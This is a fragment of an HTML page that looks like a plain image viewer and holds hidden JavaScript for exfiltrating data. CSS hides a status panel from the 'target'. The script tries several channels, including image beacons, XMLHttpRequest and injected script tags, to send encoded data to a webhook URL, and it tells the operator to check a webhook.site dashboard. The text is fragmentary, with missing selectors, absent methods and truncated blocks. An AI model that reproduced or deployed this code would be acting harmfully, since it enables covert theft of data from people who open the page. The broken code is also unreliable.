    <style>

            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            font-family: sans-serif;
        }
        .image-container {
            max-width: 90%;
            max-height: 90vh;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            border-radius: 8px;
            overflow: hidden;
            background: white;
        }
        svg {
            display: block;
            width: 100%;
            height: auto;
        }
        /* Hidden status — only visible to demo host, not target */
        #debug-panel {
            display: none;
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.85);
            color: #0f0;
            font-family: monospace;
            font-size: 12px;
            padding: 15px;
            border-radius: 6px;
            max-width: 400px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 9999;
            border: 1px solid #0f0;
        }
        #debug-panel .title {
            color: #fff;
            font-weight: bold;
            margin-bottom: 8px;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
        }
        #debug-panel .entry {
            margin: 3px 0;
            word-break: break-all;
        }
        .exfil-status {
            color: #ff0;
        }
        .exfil-success {
            color: #0f0;
        }
        .exfil-fail {
            color: #f00;

                        logEl.scrollTop = logEl.scrollHeight;

                        // ============================================================

                        // ============================================================

                            img.onerror = function() {

                            });
                        } catch(e) {
                            log('❌ Method 4 failed: ' + e.message, 'exfil-fail');
                        }

                        // METHOD 5: XMLHttpRequest (legacy but reliable)

                            xhr.onerror = function() { log('⚠️ Method 5: XHR sent (response hidden)', 'exfil-success'); };

                            log('❌ Method 5 failed: ' + e.message, 'exfil-fail');
                        }

                        log('📡 Method 6: Script injection...', 'exfil-status');
                        try {
                            var script = document.createElement('script');
                            script.src = WEBHOOK_URL + '?method=script_inject&data=' + encoded + '&_=' + Math.random();
                            script.onload = function() { log('✅ Method 6: Script injection SUCCESS', 'exfil-success'); };
                            script.onerror = function() { log('⚠️ Method 6: Script injection sent', 'exfil-success'); };
                            document.body.appendChild(script);
                        } catch(e) {
                            log('❌ Method 6 failed: ' + e.message, 'exfil-fail');
                        }

                        log('📊 Check your webhook.site dashboard for data', 'exfil-success');

                    } catch(e) {
                        log('❌ Fatal error: ' + e.message, 'exfil-fail');
                    }
